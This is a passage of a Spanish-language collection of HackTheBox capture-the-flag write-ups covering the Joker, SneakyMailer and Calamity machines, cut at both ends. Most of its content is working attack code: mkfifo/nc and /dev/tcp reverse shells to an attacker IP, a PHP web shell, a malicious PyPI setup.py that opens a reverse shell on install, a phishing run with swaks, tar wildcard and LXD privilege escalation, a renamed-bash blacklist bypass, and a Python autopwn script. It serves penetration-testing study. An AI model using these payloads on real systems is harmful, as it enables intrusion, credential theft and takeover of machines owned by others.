|------|------------|---------------------------------|--------------------|
|22    |ssh         |Accesso directo                  |usuario y contraseña|
|3128  |squid-proxy |Browsear la web por este puerto  |Checkear el exploit |

#### Browsear la web por el puerto 3128{-}

Browseando la web con el url `http://10.10.10.21:3128` no da un error que es normal porque no pasamos por el **squid-proxy**.

Utilizamos el **FoxyProxy** para añadir las credenciales del Proxy. Como no tenemos el usuario y la contraseña, dejamos estos datos
vacios.

<div class="figure">
<img src="images/squid-foxy-no-creds.png" alt="foxyproxy con squid proxy" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-5)foxyproxy con squid proxy</p>
</div>

#### Uso de curl con proxy {-}

La idea aqui es utilizar la herramienta **curl** con en argumento `--proxy` para ver si el puerto 80 esta abierto.

```bash
curl -s http://127.0.0.1 --proxy http://10.10.10.21:3128 | html2text
```

Hay un error de typo **ACCESS DENIED**, quiere decir que necesitamos un usuario y una contraseña.

Como nada esta abierto intentamos scanear la maquina por UDP

#### NMAP UPD Scan {-}

Como los scan de **NMAP** en UDP tarda un buen rato, decidimos ir a por los puertos mas interesantes.

```bash
nmap -sU -p69,161 10.10.10.21 -oN udpScan
```

encontramos el puerto del tftp que esta abierto

#### TFTP {-}

```bash
tftp 10.10.10.21
```

Nos podemos conectar pero no podemos cojer ficheros como `/etc/passwd`, `/etc/hosts` y otros. Tiramos por el fichero de config de squid.

```bash
get /etc/squid/squid.conf
```

#### Check squid.conf file {-}

```bash
cat squid.conf | grep -v "^#" | sed '/^\s*$/d'
```

Vemos que hay un fichero password. Lo descargamos desde el **tftp**

```bash
get /etc/squid/passwords
```

Lo analizamos y encontramos un usuario y una contraseña encriptada.


<!--chapter:end:04-Joker/04-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt passwords
```

Ya hemos crackeado la contraseña. Intentamos conectar por ssh pero no funciona.

Pues ponemos las credenciales en el foxyproxy.

### Conectamos por la web a la 127.0.0.1 {-}

Hay una pagina que propone shortear una url. Vamos a testear el servicio web

1. Nos creamos un servidor web con python

    ```bash
    python -m http.server 80
    ```
1. En el servicio intentamos shortear la url `http://10.10.14.20/test`

No hace nada. Vemos en el codigo fuente que hay un recurso `/list`. La idea aqui es aplicar fuzzing. Como tenemos que pasar
por un proxy, vamos a utilizar **Burp** para conectar el fuzzer con el proxy.

1. Creamos un Proxy Server.

    - En la pagina **User options** de Burp, creamos un proxy server

        <div class="figure">
        <img src="images/burp-create-proxy-server.png" alt="BurpSuite: create proxy server" width="90%" />
        <p class="caption">(\#fig:unnamed-chunk-6)BurpSuite: create proxy server</p>
        </div>

1. Añadir el puerto 80 para utilizar **curl** y **wfuzz**

    <div class="figure">
    <img src="images/burp-add-port-80-1.png" alt="BurpSuite: create proxy server 1" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-7)BurpSuite: create proxy server 1</p>
    </div>

    <div class="figure">
    <img src="images/burp-add-port-80-2.png" alt="BurpSuite: create proxy server 2" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-8)BurpSuite: create proxy server 2</p>
    </div>

1. Testeamos con **curl**

    ```bash
    curl -s http://127.0.0.1 | html2text
    ```

Ya no nos pone el mensaje de error `Conexion reusada`, quiere decir que el server proxy que hemos creado con
BurpSuite funciona. Ya podemos aplicar fuzzing.

### WFUZZ {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt http://127.0.0.1/FUZZ
```

Encontramos el recurse `/console`

### Consola Interactiva {-}

Estamos en frente de una consola interactiva donde se puede ejecutar code en python

```python
import os

os.system('whoami')
#Output
0
```

En este caso la respuesta al lado del servidor es `0`. Suponemos que la respuesta es el codigo de estado. Utilizamos la funccion
`os.popen(<command>).read()` para ver el output normal.

```python
os.popen('whoami').read()
#Output
'Werkzeug'
```

El comando funcionna. Ahora intentamos **pingear** nuestra maquina de atacante.

1. en la maquina de atacante

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. En la consola interactiva python

    ```python
    os.system('ping -c 1 10.10.14.20')
    ```

Recibimos la trasa ICMP.

Intentamos recuperar ficheros de la maquina victima antes de entablar una reverse shell. Como el comando
`os.popen('cat /etc/passwd').read()` nos retorna el resultado en una linea y que no es muy legible, S4vi nos
recomienda encriptar la respuesta en base 64 para despues decodificarlo en la maquina de atacante con el comando
`echo "<cadena codificada en base64>" | base64 -d; echo`

```python
os.popen('base64 -w 0 /etc/passwd').read()
os.popen('base64 -w 0 /etc/iptables/rules.v4').read()
```

El iptables nos muestra con la linea `-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP` que la maquina victima nos
va a rechazar todas las comunicaciones por **TCP**. Es por esta razon que no hemos creado directamente una reverse shell.
 

<!--chapter:end:04-Joker/04-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando acceso {-}

### Reverse shell por UDP {-}

1. En la maquina de atacante con el parametro `-u`

    ```bash
    nc -u -nlvp 443
    ```

1.en la consola interactiva

    ```python
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.14.20 443 >/tmp/f")
    ```

Y ya esta...

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Investigamos la maquina {-}

```bash
whoami

#Output
werkzeug

cd /home/alekos
cat user.txt
```

No podemos leer la flag. Quiere decir que vamos a tener que convertirnos en el usuario alekos.

```bash
id
sudo -l
```

El comando `sudo -l` nos dice que podemos ejecutar `sudoedit /var/www/*/*/layout.html` como el usuario alekos. 

<!--chapter:end:04-Joker/04-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Escalada de privilegios al usuario alekos {-}

```bash
ls -l /var/www
```

No tenemos capacidad de escritura en el directorio `/var/www` pero hay un directorio testing donde el usuario proprietario es werkzeug.

```bash
cd /var/www/testing
ls -l
mkdir hannamod
cd !$
echo "Hola" > layout.html
```

Testeamos el comando **sudoedit**

```bash
sudoedit -u alekos /var/www/testing/hannamod/layout.html
```

El comando no abre un nano en el cual podemos editar el contenido. El truco aqui es burlar el fichero para que el usuario pueda editar
un ficher tercio en el cual tenga capacidad de escritura

1. Creamos un enlace symbolico contra el **authorized_keys** del usuario alekos

    ```bash
    ln -s -f /home/alekos/.ssh/authorized_keys layout.html
    ```

1. Nos creamos un par de claves

    ```bash
    ssh-keygen
    ```

1. Lanzamos el **sudoedit** y copiamos la clave publica creada
1. Nos conectamos al usuario alekos por ssh

    ```bash
    ssh -i id-rsa alekos@10.10.10.21
    ```

Pa dentro... somos alekos y podemos leer la flag.

### Escalada de privilegios al usuario root {-}

```bash
id
sudo -l
ls -l
```

vemos que hay dos directorios 

- backup
- development

```bash
cd backup
stat *
stat * | grep "Modify"
```

En el directorio backup vemos que cada 5 minutos una tarea que se esta ejecutando a intervalos regulares de tiempo nos crea un archivo de backup.
Ahora tenemos que saber lo que se esta poniendo en estos backups.

1. En la maquina de atacante

    ```bash
    nc -u -nlvp 443 > dev-1627332901.tar.gz
    ```

1. En la maquina victima

    ```bash
    nc -u 10.10.14.20 443 < dev-1627332901.tar.gz
    ```

mirando el contenido de fichero comprimido, nos damos cuenta que el contenido es el mismo que el directorio development.

Saviendo esto estamos intuiendo que la tarea cron ejecuta un comando del estilo: `tar -cvf backup/test.tar.gz /home/alekos/development/*`.
Aqui el problema es que si el comando es este, el simbolo `*` permitteria burlar el comando tar con breakpoints. Lo que queremos ejecutar seria
el comando siguiente:

```bash
tar -cvf backup/test.tar.gz /home/alekos/development/* --checkpoint=1 --checkpoint-action=exec/bin/sh
```

El echo es que si el comando de la tarea cron tiene el asterisco y que ficheros tienen nombres como `--checkpoint=1` y `--checkpoint-action=exec/bin/sh`,
en vez de copiarlos, los utilizaria como argumentos del proprio comando tar.

```bash
touch privesc
chmod +x privesc

nano privesc

############privesc content##############3

#!/bin/bash

chmod 4755 /bin/bash
```

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh privesc'
```

Ya esta esperamos hasta el proximo run de la tarea cron.

```bash
watch -n 1 ls -l /bin/bash -d
```

Cuando vemos que la /bin/bash tiene el `s` de SUID podemos convertirnos en root

```bash
bash -p
```


<!--chapter:end:04-Joker/04-04-PrivilegeEscalation.Rmd-->

# SneakyMailer {-}

## Introduccion {-}

La maquina del dia 26/07/2021 se llama SneakyMailer
.

El replay del live se puede ver en [Twitch: S4vitaar SneakyMailer maquina](https://www.twitch.tv/videos/1098850596)

<!--chapter:end:05-SneakyMailer/05-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.197
```
ttl: 63 -> maquina linux. 
Recuerda que tratandose de ttl 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.197 
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.197 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,25,80,143,993,8080 10.10.10.197 -oX targetedXML
```


|Puerto|Servicio    | Que se nos occure?                  |    Que falta?      |
|------|------------|-------------------------------------|--------------------|
|21    |ftp         |Conexion como Anonymous              |                    |
|22    |ssh         |Accesso directo                      |usuario y contraseña|
|25    |smtp        |Por detras hay algo rel. email       |                    |
|80    |http        |Redirect to sneakycorp.htb hosts     |                    |
|143   |IMAP        |Connectar para listar contenido mail |usuario y contraseña|
|993   |squid-proxy |Browsear la web por este puerot      |Checkear el exploit |
|8080  |http        |Browsear la web por este puerto      |Checkear la web     |


#### FTP {-}

Intentamos conectarnos como anonymous.

```bash
ftp 10.10.10.197
> Name : anonymous
```

#### Whatweb {-}

```bash
whatweb http://10.10.10.197
```

Hay un redirect a `sneakycorp.htb`

#### Add sneakycorp.htb host {-}

```bash
nano /etc/hosts
```

<div class="figure">
<img src="images/hosts-sneakycorp.png" alt="hosts sneakycorp.htb" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-9)hosts sneakycorp.htb</p>
</div>

#### Checkear la web del puerto 8080 {-}

Abrimos la web y vemos cosas:

- Ya estamos logeados
- Hay mensajes de collegasos, pinchamos pero no passa nada
- Proyecto pypi testeado a 80%
- Proyecto POP3 y SMTP testeado completamente
- Es possible installar modulos con pip en el servidor
- Hay un enlace a Team y vemos una lista de emails


#### Recuperar la lista de email con CURL {-}

```bash
curl -s -X GET "http://sneakycorp.htb/team.php" | html2text | grep "@" | awk 'NF{print $NF}' > email.txt
```


<!--chapter:end:05-SneakyMailer/05-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Swaksear la lista de email {-}

Es comun que en algunos servicios mail, nos podemos conectar al servidor y enviar email con un correo que no existe bajo el servidor indicado. 
Se puede hacer con la herramienta **swaks**. Aqui lo hacemos por el puerto **25**

```bash
nc -nlvp 80
```

```bash
swaks --to $(cat email.txt | tr '\n' ',') --from "s4vitar@sneakymailer.htb" \
--header "Subject: EEEEEEEE" --body "OH DIOS MIO ES DIAMOND JACKSON -> http://10.10.14.20/diamondjackson.jpg" \
--server 10.10.10.197
```

Ya vemos que podemos enviar el mail y que ademas alguien a pinchado el enlace. Ademas como utilizamos **nc** y no **python**
podemos ver la data enviada en raw. En la data vemos que podemos ver el usuario, el email y su password en formato url encode.

```bash
php --interactive

> print urldecode()"firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt"
```

Ya vemos la contraseña del usuario en texto claro.

Intentamos conectar por **SSH** y **FTP** pero nada

### Conectar por el IMAP con NC {-}

1. Logear por IMAP con NC

    ```bash
    nc 10.10.10.197 143

    A1 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
    #Output
    A1 OK LOGIN Ok.
    ```

1. Listar el contenido

    ```bash
    A2 LIST "" "*"
    ```
    
1. Seleccionar INBOX

    ```bash
    A3 SELECT "INBOX"
    ```

1. Seleccionar los mensajes enviados

    ```bash
    A4 SELECT "INBOX.Sent"
    ```

1. Seleccionar los items enviados

    ```bash
    A5 SELECT "INBOX.Sent Items"
    ```

1. Seleccionar lo que hay en la papelera

    ```bash
    A6 SELECT "INBOX.Deleted Items"
    ```

1. Vemos que hay dos elementos en los items enviados, los recuperamos

    ```bash
    A7 FETCH 1:2 BODY[]
    ```

En los bodys encontramos un un mensaje que pregunta para cambiar la contraseña del usuario developer poniendo 
y la contraseña original en texto claro.
En el otro mensaje otra vez hablan del servicio **Pypi**

Con el usuario y contraseña intentamos volver a conectar con **FTP**

### Conexion con FTP {-}

```bash
ftp 10.10.10.197

> Name: developer
> Password: contraseña
#Output
Connection succesful

dir
cd dev
dir
```

Aqui vemos el contenido de la web. Nos creamos la famosa `s4vishell.php`

```php
<?php
    echo "<pre>". shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

ahora con el ftp subimos el archivo.

```bash
put s4vishell.php
#Output
transfer complete
```

Controlamos en la web si vemos el fichero `http://sneakycorp.htb/s4vishell.php` pero tenemos un *404 NOT FOUND*.
Intentamos con otras url:

- `http://sneakycorp.htb/s4vishell.php`
- `http://10.10.10.197:8080/s4vishell.php`
- `http://10.10.10.197:8080/dev/s4vishell.php`

pero nada. Aqui pensamos en que podria tener otros subdominios.

### Descubrimientos de subdominios de dos formas {-}

#### Descubrimiento de subdominios con GOBUSTER {-}

```bash
gobuster vhost -u http://sneakycorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Encontramos el subdominio `dev.sneakycorp.htb`

#### Descubrimiento de subdominios con WFUZZ {-}

```bash
wfuzz -c -t 200 --hw=12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.sneakycorp.htb" http://10.10.10.197
```

Encontramos el subdominio `dev.sneakycorp.htb`

#### Retocamos en hosts {-}

```bash
nano /etc/hosts
```

<div class="figure">
<img src="images/hosts-dev-sneakycorp.png" alt="hosts dev.sneakycorp.htb" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-10)hosts dev.sneakycorp.htb</p>
</div>

### Browsear el nuevo dominio {-}

Como aqui ya tenemos un nuevo dominio browseamos la web en `dev.sneakycorp.htb/s4vishell.php` y ahora si encontramos nuestra webshell.

- whoami con `dev.sneakycorp.htb/s4vishell.php?cmd=whoami`
- verificamos si estamos en un contenedor con `dev.sneakycorp.htb/s4vishell.php?cmd=hostname -I`

no es el caso y tenemos capacidad de remote code execution. Ahora intentamos ganar acceso al sistema.

<!--chapter:end:05-SneakyMailer/05-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando acceso {-}

### Crear una reverse shell con s4vishell.php {-}

1. Escuchamos por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Ejecutamos una reverse shell 

    ```bash
    dev.sneakycorp.htb/s4vishell.php?cmd=nc -e /bin/bash 10.10.14.20 443
    ```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Descubrimiento de la maquina {-}

```bash
ls -l
cd /home
cd low
ls -la
cd .ssh
ls
cat authorized_keys
ps -fawwx
```

Vemos la flag pero no podemos leerla. Huele a que nos tenemos que convertir al usuario **low**. Tambien vemos un recurso **Pypi** con
un fichero de credenciales tipo `.htpasswd`

```cat
cat /var/www/pypi.sneakycorp.htb/.htpasswd
```

Vemos la contraseña del usuarion **pypi**. La copiamos en la maquina de atacante y tratamos de romperla con **John**

Por ultimo se puede ver un nuevo subdominio llamado `pypi.sneakycorp.htb`, lo introduzimos en el `/etc/hosts`

### Crackeo con John {-}

Copiamos el contenido del fichero .htpasswd en un fichero llamado hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Hemos podido crackear la contraseña del usuario pypi


### Descubrimiento de la configuration NGINX {-}

Intentando conectarnos a la web por el subdominio `pypi.sneakycorp.htb`, vemos que hay una redirection automatica al domino normal.
Sabiendo que estamos en frente de un **NGINX**, analizamos como el reverse proxy esta configurado.

```bash
cd /etc/nginx
ls
cd sites-enabled
cat sneakycorp.htb
cat pypi.sneakycorp.htb
```

Hay ya vemos que para ir al subdominio `pypi.sneakycorp.htb` tenemos que pasar por el puerto **8080**, y efectivamente si browseamos
la web con `pypi.sneakycorp.htb:8080` ya podemos ver la web del **pypi server**

### Crear un packete malicioso para pypi {-}

Como el servicio pypi es un server que tiene conectividad con el exterior, podemos seguir lo siguientes pasos en la maquina de atacante.

```bash
mkdir pypi
cd !$
mkdir pwned
cd !$
touch __init__.py
touch setup.py
```

El fichero `__init__.py` se queda vacio y el contenido del `setup.py` seria el siguiente.

```python
import setuptools
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.20",443))
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

setuptools.setup(
    name="example-pkg-YOUR-USERNAME-HERE",
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
)
```

La idea aqui es que cuando el pypi server ejecute el setup.py, queremos que nos entable una reverse shell. El codigo
de la reverse shell es de **monkey pentester** y la hemos retocado para que vaya en el fichero `setup.py`.

Configuramos el equipo para poder enviar el paquete al repositorio victima.

```bash
rm ~/.pypirc
vi ~/.pypirc
```

El contenido del fichero `.pypirc` seria

```bash
[distutils]
index-servers = remote

[remote]
repository = http://pypi.sneakycorp.htb:8080
username = pypi
password = soufianeelhaoui
```

Ahora podemos enviarlo

1. Nos ponemos en escucha en el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Enviamos el paquete al pypi server

    ```bash
    python3 setup.py sdist upload -r remote
    ```

1. Tenemos una shell pero primero nos a ejecutado desde nuestro propio equipo

    - no ponemos una vez mas en escucha al puerto 443

        ```bash
        nc -nlvp 443
        ```

    - en el primero shell le damos a exit

Y ya esta

```bash
whoami
#Output
Law
```

Ya le podemos hacer un nuevo tratamiento de la TTY.


<!--chapter:end:05-SneakyMailer/05-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
sudo -l
```

vemos aqui que podemos utilizar la heramienta pip3 con el privilegio del usuario root sin proporcionar contraseña.

Miramos en [GTFOBINS](https://gtfobins.github.io/gtfobins/pip/#sudo)

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
pip3 install $TF

whoami
#Output
root
```

<!--chapter:end:05-SneakyMailer/05-04-PrivilegeEscalation.Rmd-->

# Calamity {-}

## Introduccion {-}

La maquina del dia 28/07/2021 se llama Calamity
.

El replay del live se puede ver aqui

[![S4vitaar Calamity maquina](https://img.youtube.com/vi/sREANcb8H1Q/0.jpg)](https://www.youtube.com/watch?v=sREANcb8H1Q)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:06-Calamity/06-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.27
```
ttl: 63 -> maquina linux. 
Recuerda que tratandose de ttl 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.27 -oG allports
extractPorts allPorts
nmap -sC -sV -p22,80 -oN targeted
```

|Puerto|Servicio    | Que se nos occure?                  |    Que falta?      |
|------|------------|-------------------------------------|--------------------|
|22    |ssh         |Accesso directo                      |usuario y contraseña|
|80    |http        |Analizis de la web y Fuzzing         |                    |

### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.197
```

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.27 -oN webScan
```

Ya nos detecta un `/admin.php` y un directorio `/uploads/`

#### Checkear la web del puerto 80 {-}

Abrimos la web y vemos cosas:

- El wappalizer no nos dice nada
- parece que todavia la web esta en fase de desarollo
- el directorio `/uploads/` muestra una capacidad de directory listing pero no se ve gran cosa
- el `/admin.php` nos muestra un login.
- haciendo un `Ctrl-U` no muestra una contraseña en un comentario ;)





<!--chapter:end:06-Calamity/06-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Chequeamos las vulnerabilidades de la pagina admin.php {-}

Ya con el usuario admin y la contraseña encontrada nos podemos logear.

Vemos un input donde podemos poner codigo **HTML**

```bash
Hola
<h1>Hola</h1>
<marquee>Hola</marquee>
```

Funciona... Intentamos ponerle codigo **PHP**

```php
<?php system("whoami"); ?>
```

y tambien funciona...

Aqui decidimos crear una reverse shell para conectarnos al servidor.

<!--chapter:end:06-Calamity/06-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando acceso {-}

### Crear una reverse shell con una pagina html {-}

1. Creamos un index.html

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.28/443 0>&1
    ```

1. Compartimos un servicio http por el puerto 80

    ```bash
    python3 -m http.server 80
    ```

1. En la web, le damos un curl a nuestra maquina

    ```php
    <?php system("curl 10.10.14.28"); ?>
    ```


Aqui vemos el codigo fuente del index.html creado. La idea aqui seria interpretar el codigo.

1. Escuchamos por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Ejecutamos la reverse shell 

    ```php
    <?php system("curl 10.10.14.28 | bash"); ?>
    ```

La coneccion se entabla pero el servidor nos expulsa directamente.

### Creamos una FakeShell {-}

En el directorio exploits creamos un fichero `fakeShell.sh` que contiene

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# Variables globales
main_url="http://10.10.10.27/admin.php"

while true; do
    echo -n "[~] " && read -r command
    echo; curl -s -G $main_url --data-urlencode "html=<?php system(\"$command\"); ?>" --cookie "adminpowa=noonecares" | grep "\/body" -A 500 | grep -v "\/body"; echo
done
```

> [ ! ] Notas: Las explicaciones del script se pueden ver en el video live en el minuto 50:19

Tambien se podria utilizar la heramienta creada por s4vitar [ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)

### Analizando el servidor {-}

```bash
whoami
ifconfig
ls -l
ls -l /home
ls -l /home/xalvas
cat /home/xalvas/user.txt
```

Encontramos el usuario **xalvas** y ya podemos leer la flag.

La pregunta aqui seria: Porque no nos deja entablar una reverse shell? Porque el sistema nos expulsa cuando lo hacemos?

El comando `ls -l /home/xalvas` nos muestra ficheros. En el fichero `intrusions` vemos lo siguiente

```bash
cat /home/xalvas/intrusions
```

<div class="figure">
<img src="images/calamity-intrusions.png" alt="fichero intrusions" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-11)fichero intrusions</p>
</div>

Vemos que el comando `nc` esta BlackListeado y que logea el Proccess Kill en este fichero. El problema de esto es que se puede
que los comandos BlackListeados se controlan con los nombres mismo (no permite `nc, python, bash`). Pero que pasa si copiamos el 
binario bash y que le ponemos un nombre diferente.

1. Nos ponemos en escucha por el puerto 443 en la maquina de atacante

    ```bash
    nc -nlvp 443
    ```

1. Copiamos el tool bash en un lugar donde tenemos derechos de escritura y lo nombramos de otra manera

    ```bash
    cp /bin/bash /dev/shm/s4vitar
    ls /dev/shm/s4vitar
    /dev/shm/s4vitar -i >& /dev/TCP/10.10.14.20/443 0>&1
    /dev/shm/s4vitar -c "/dev/shm/s4vitar -i >& /dev/TCP/10.10.14.20/443 0>&1"
    /dev/shm/s4vitar -c '/dev/shm/s4vitar -i >& /dev/TCP/10.10.14.20/443 0>&1'
    ```

Este truquillo muestra la manera de BlackListear que utiliza la maquina victima porque ya hemos podido entablar la shell
y no nos mata la session.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
export SHELL=bash

stty -a

stty rows <numero filas> columns <numero columnas>
```

### Creacion del autopwn en python {-}

Aqui s4vitar decide crear un autopwn para automatizar el processo de ganacia de accesso

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal
import threading
import time

from pwn import *

def def_handler(sig, frame):
    
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.27/admin.php"
burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def makeRequest():

    headers = {
        'Cookie': 'adminpowa=noonecares'
    }

    r = requests.get(main_url + "?html=<?php%20system(\"cp%20/bin/bash%20/dev/shm/s4vitar\");%20?>", headers=headers)
    r = requests.get(main_url + "?html=<?php%20system(\"chmod%20+x%20/dev/shm/s4vitar\");%20?>", headers=headers)
    r = requests.get(main_url + "?html=<?php%20system(\"/dev/shm/s4vitar%20-c%20'/dev/shm/s4vitar%20-i%20>%26%20/dev/tcp/10.10.14.20/443%200>%261'\");%20?>", headers=headers)

    print(r.text)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest,args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=10).wait_for_connection()

    shell.interactive()
```

Ya lo podemos lanzar con el comando `python3 autopwn.py`

> [ ! ] Notas las explicaciones paso a paso del autopwn se pueden ver en el video al minuto 1:06:21


### Investigamos la maquina {-}

Ya hemos visto una lista de archivos en el repertorio de xalvas y uno es un fichero `.wav`. Nos lo enviamos
a nuestra maquina de atacante.

1. En la maquina de atacante

    ```bash
    nc -nlvp 443 > recov.wav
    ```

1. En la maquina victima

    ```bash
    cp /bin/nc /dev/shm/transfer
    chmod +x /dev/shm/transfer
    /dev/shm/transfer 10.10.14.20 443 < recov.wav
    ```

Hay otros ficheros de tipo `.wav`, usando la misma tecnica nos lo enviamos tambien.
Chequeamos que los ficheros no sa hayan comprometido durante la tansferencia con `md5sum`. Los ficheros `.wav` son ficheros
de tipo audio y se pueden escuchar con el comando `play recov.wav`

No os asusteis con la musiquita ;)

Escuchando los otros ficheros parece que el fichero `rick.wav` sea la misma cancion y esto es raro. Si le hacemos un `md5sum recov.wav rick.wav`,
vemos que la cancion es la misma pero el **md5sum** no. Quiere decir que la integridad de la data de uno de estos ficheros a sido manipulada.


### Reto de steganografia con Audacity {-}

**Audacity** es una heramienta de audio que se puede instalar con `apt install audacity`. Lo abrimos y cargamos los dos ficheros.
Si nos dan 2 audios que parecen se los mismos pero hemos visto con el **md5sum** que no son iguales, Una cosa que se puede hacer es 
lanzar un audio de manera normal y al mismo tiempo con el segundo audio, invertir la onda del audio. Si hacemos esto y que los dos ficheros
son ciertamente iguales, no tendriamos que escuchar nada. Lo unico, en este caso que se tendria que escuchar seria las diferencias ente
los dos audios.

> [ ! ] Notas para ver como invertir las ondas de un audio, podeis mirar el video al minuto 1:31:00

Ya tenemos una contraseña.

Intentamos ponerle la contraseña al usuario xalvas y entramos

```bash
su xalvas
Password: <la contraseña>
whoami
#Output 
xalvas
```

<!--chapter:end:06-Calamity/06-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
whoami
id
```

En este punto vemos que el usuario xalvas esta en el grupo **lxd** y ya tenemos la posibilidad de escalar privilegios con esto.

```bash
searchsploit lxd
searchsploit -x 46978
```

Si Si el exploit a sido creado por el mismo S4vitar. Para usar el exploit, lo primero es mirar si estamos en una maquina 32 o 64 bits.

```bash
uname -a
```

Seguimos los pasos del exploit

1. En la maquina de atacante

    ```bash
    wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
    chmod +x build-alpine
    ./build-alpine # --> para maquinas x64
    ./build-alpine -a i686 # --> para maquinas i686
    searchsploit -m 46978
    mv 46978.sh lxd_privesc.sh
    dos2unix lxd_privesc.sh
    python3 -m http.server 80
    ```

1. En la maquina victima

    ```bash
    wget http://10.10.14.20/alpine-v3-14-i686-20210728_2134.tar.gz
    wget http://10.10.14.20/lxd_privesc.sh
    chmod +x lxd_privesc.sh
    ./lxd_privesc.sh -f alpine-v3-14-i686-20210728_2134.tar.gz
    ```

1. vemos un error `error: This must be run as root`. Modificamos el fichero lxd_privesc.sh

    ```bash
    nano lxd_privesc.sh
    ```

    en la function createContainer(), borramos la primera linea:
    
    ```bash
    # lxc image import $filename --alias alpine && lxd init --auto
    ```

1. Ya estamos root pero en el contenedor. Modificamos la `/bin/bash` de la maquina

    - en el contenedor

        ```bash
        cd /mnt/root
        ls
        cd /bin
        chmod 4755 bash
        exit
        ```

    - en la maquina victima

        ```bash
        bash -p
        whoami
        #Output
        root
        ```

<!--chapter:end:06-Calamity/06-04-PrivilegeEscalation.Rmd-->

# Scavenger {-}

## Introduccion {-}

La maquina del dia 29/07/2021 se llama Scavenger
.

El replay del live se puede ver aqui

[![S4vitaar Scavenger maquina](https://img.youtube.com/vi/U5QLCweacCY/0.jpg)](https://www.youtube.com/watch?v=U5QLCweacCY)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:07-Scavenger/07-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.155
```
